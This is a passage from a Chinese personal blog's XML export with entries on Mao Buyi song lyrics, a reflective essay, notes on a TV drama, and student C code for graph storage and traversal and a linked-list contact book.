        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链式存储</tag>
      </tags>
  </entry>
  <entry>
    <title>呓语</title>
    <url>/2021/10/10/%E5%91%93%E8%AF%AD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 毛不易</p>
<p>作曲 : 毛不易</p>
<p>一段未醒</p>
<p>又做一段</p>
<p>如果这画面有开关</p>
<p>从期待走到不堪</p>
<p>结局不好看</p>
<p>人总需要记住遗憾</p>
<p>它来过 它走了</p>
<p>没回头 没问过</p>
<p>你可舍得</p>
<p>日月蹉跎</p>
<p>小起大落</p>
<p>光阴里有多少景色</p>
<p>偶尔也心口一热</p>
<p>什么都不说</p>
<p>好过亲手把它撕破</p>
<p>路还长 梦还多</p>
<p>被这话 欺骗的</p>
<p>何止你我</p>
<p>可是我现在依然不太会转弯</p>
<p>虽然孤单的人偶尔也想有个伴</p>
<p>冷风又吹的时候想说</p>
<p>这生活会不会有点难</p>
<p>难道是因为当初有话没讲完</p>
<p>堵在喉咙里却始终不敢大声喊</p>
<p>算了 别哭</p>
<p>日月蹉跎</p>
<p>小起大落</p>
<p>光阴里有多少景色</p>
<p>偶尔也心口一热</p>
<p>什么都不说</p>
<p>好过亲手把它撕破</p>
<p>路还长 梦还多（不多）</p>
<p>被这话 欺骗的</p>
<p>何止你我</p>
<p>可是我现在依然不太会转弯</p>
<p>虽然孤单的人偶尔也想有个伴</p>
<p>冷风又吹的时候想说</p>
<p>这生活会不会有点难</p>
<p>难道是因为当初有话没讲完</p>
<p>堵在喉咙里却始终不敢大声喊</p>
<p>算了 别哭</p>
<p>可是我偏偏就是不想要转弯</p>
<p>就算不开灯的房间真的有些暗</p>
<p>夜色又来的时候想说</p>
<p>为什么只留给我一半</p>
<p>难道是因为出现的人都伪善</p>
<p>擅长告别擅长躲闪擅长分两端</p>
<p>算了 别哭</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>唯愿我们</title>
    <url>/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="唯愿我们"><a href="#唯愿我们" class="headerlink" title="唯愿我们"></a>唯愿我们</h3><p>从鲜衣怒马到鬓染白发 </p>
<p>不过弹指一刹那； </p>
<p>从小桥人家到沧海无涯</p>
<p>匆匆一眼尽繁华。 </p>
<p>流年似水， 往事不可追； </p>
<p>光阴似箭， 物是人已非。 </p>
<p>让烦恼缠绕心尖， 生活一片颓然； </p>
<p>让痛苦徘徊耳边， 人生全是不满。</p>
<p>感情的遗憾， 不如放手随他。 </p>
<p>想送你回家的人， </p>
<p>东西南北都顺路； </p>
<p>想陪你吃饭的人， </p>
<p>酸甜苦辣都可口；</p>
<p>想见你一面的人，</p>
<p>隔山隔海都能来。</p>
<p>生活的刁难， 不如看淡放宽。</p>
<p>生命这一程， 交织着风霜雨雪；</p>
<p>人生这一段， 夹杂着泥泞坎坷。 </p>
<p>没有跨不过的河， </p>
<p>没有迈不过的坎。</p>
<p>内心的执迷， 不如随风飘散。</p>
<p>有一往无前， 就有知难而退。 </p>
<p>看透了， 便是过眼云烟； </p>
<p>想通了， 不过昙花一现。 </p>
<p>不念过去， 不畏将来， </p>
<p>你若不放心上， 岁月便会无恙。</p>
<p>边走边看， 是一种优雅；</p>
<p>边走边忘， 是一份豁达。 </p>
<p>敬往事一杯酒， 愿岁月不回头。 </p>
<p><strong>唯愿我们：</strong></p>
<p>  <strong>过去的， 别再遗憾；</strong><br>  <strong>未来的， 无须忧虑；</strong><br>  <strong>现在的， 加倍珍惜。</strong></p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>图</title>
    <url>/2021/11/14/%E5%9B%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、图的基本存储结构"><a href="#一、图的基本存储结构" class="headerlink" title="一、图的基本存储结构"></a>一、图的基本存储结构</h1><p>需要存储的内容：存储 顶点信息、顶点之间的关系</p>
<p><strong>三种常用的 图的 存储结构：</strong></p>
<ul>
<li>邻接矩阵</li>
<li>邻接表</li>
<li>临界多重链表</li>
</ul>
<h2 id="1-1-邻接矩阵"><a href="#1-1-邻接矩阵" class="headerlink" title="1.1 邻接矩阵"></a>1.1 邻接矩阵</h2><p><strong>存储结构：</strong></p>
<ul>
<li><p>一维数组（顺序表）——  存储 数据元素的信息</p>
</li>
<li><p>二维数组（邻接矩阵）—— 存储 数据元素之间的 关系</p>
</li>
</ul>
<p><strong>特点：</strong></p>
<ul>
<li><p>无向图的邻接矩阵 一定是对称的，可使用 上三角或者是 下三角进行压缩存储，其存储空间只需要 <code>n(n+1)/2</code></p>
</li>
<li><p>有向图的邻接矩阵 不一定是 对称的，其存储空间为 <code>n 的平方</code></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000		<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;	<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>				<span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  	<span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  	<span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;				<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br></pre></td></tr></table></figure>

<p><strong>建立网络的 邻接矩阵算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = fopen(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>缺点：邻接矩阵法，占用的存单元只与图中顶点的个数有关，与边数无关，如果一个图中的边数比结点个数少得多，则该邻接矩阵中就会出现很对的空元素，从而浪费空间。</p>
<h2 id="1-2-邻接表"><a href="#1-2-邻接表" class="headerlink" title="1.2 邻接表"></a>1.2 邻接表</h2><p><strong>存储结构：</strong></p>
<ul>
<li>头结点：两个域—–数据域 <code>vertex</code> ，头指针域 <code>firstedge</code></li>
<li>表结点：两个域—–邻接点域 <code>adjvex</code>  ，链域  <code>next</code></li>
<li>如果是网络，带权值，则可在头结点中添加一个数据域来存储权值</li>
</ul>
<p>出边表（有向图的邻接表）、入边表（逆邻接表）</p>
<p><strong>如果图中含有 n 个顶点，e  条边，则它的邻接表存储结构需要 n个头结点和 2e 个边结点</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;	<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>	<span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;			<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span>	<span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span>	<span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;	<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;			</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>			<span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;			  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br></pre></td></tr></table></figure>

<p><strong>无向图邻接表建立算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);		<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);		<span class="comment">//输入无序对</span></span><br><span class="line">			s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">			s-&gt;adjvex = j;</span><br><span class="line">			s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">			g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line">			<span class="keyword">if</span>(c == <span class="number">0</span>)&#123;			<span class="comment">//无向图</span></span><br><span class="line">				s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">				s-&gt;adjvex = i;</span><br><span class="line">				s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">				g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>		<span class="comment">//文件打开失败</span></span><br><span class="line">		g-&gt;n = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：文件输入 数据内容时，第一行的结点个数不变，为 n，但是边数得是 2e</p>
<h2 id="1-3-邻接多重表"><a href="#1-3-邻接多重表" class="headerlink" title="1.3 邻接多重表"></a>1.3 邻接多重表</h2><p>边表结点：五个域</p>
<ul>
<li><p>mark    标志域（是否被访问过）</p>
</li>
<li><p>vexi  vexj   该边两个顶点在图中的位序</p>
</li>
<li><p>linki  linkj   两个边结点的指针</p>
<p>linki  指向关联与 vexi 结点的下一条边</p>
<p>linkj  指向关联与  vexj 结点的下一条边</p>
</li>
</ul>
<p>表头结点：两个域</p>
<ul>
<li>vertex  顶点信息</li>
<li>firstedge   关联与 顶点 的 第一条边</li>
</ul>
<h1 id="二、图的遍历"><a href="#二、图的遍历" class="headerlink" title="二、图的遍历"></a>二、图的遍历</h1><h2 id="2-1-深度优先遍历"><a href="#2-1-深度优先遍历" class="headerlink" title="2.1 深度优先遍历"></a>2.1 深度优先遍历</h2><p>访问顺序域图的邻接表的存储状态有关，由于图的邻接表存储不是唯一的，则对于同一个图，其深度优先遍历的输出结果也是不同的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;visit vertex: %c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;		<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;		<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])		<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-广度优先遍历"><a href="#2-2-广度优先遍历" class="headerlink" title="2.2 广度优先遍历"></a>2.2 广度优先遍历</h2><p>特点：尽可能地首先对 横向结点进行访问</p>
<p>使用队列，使用邻接表存储结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[M];   <span class="comment">//全局标志：是否访问过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>;		 <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;		<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;	<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;		<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line">    count = BfsTraverse(g);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n 该图共有 %d 个连通分量。\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>恶之花有感</title>
    <url>/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p>
<p>即使不愿成为太阳，却依然绚烂夺目。</p>
]]></content>
      <categories>
        <category>影视有感</category>
      </categories>
  </entry>
  <entry>
    <title>数据结构第一次实验-简易通讯录</title>
    <url>/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="数据结构第一次实验-—-简易通讯录"><a href="#数据结构第一次实验-—-简易通讯录" class="headerlink" title="数据结构第一次实验 — 简易通讯录"></a>数据结构第一次实验 — 简易通讯录</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];  <span class="comment">//编号</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>]; <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">char</span> sex[<span class="number">5</span>];  <span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">char</span> tele[<span class="number">20</span>];<span class="comment">//电话</span></span><br><span class="line">    <span class="keyword">char</span> add[<span class="number">30</span>]; <span class="comment">//住址</span></span><br><span class="line">    <span class="keyword">char</span> group[<span class="number">20</span>];<span class="comment">//分组</span></span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span>&#123;</span></span><br><span class="line">    Person data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line">List *L = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一、初始化通讯录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    L = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化通讯录成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二、创建 通讯录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;		<span class="comment">// 插入 记录 计数</span></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;		<span class="comment">//作为是否继续录入的标志</span></span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//前插</span></span><br><span class="line">        node-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//三、创建 通讯录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_behind</span><span 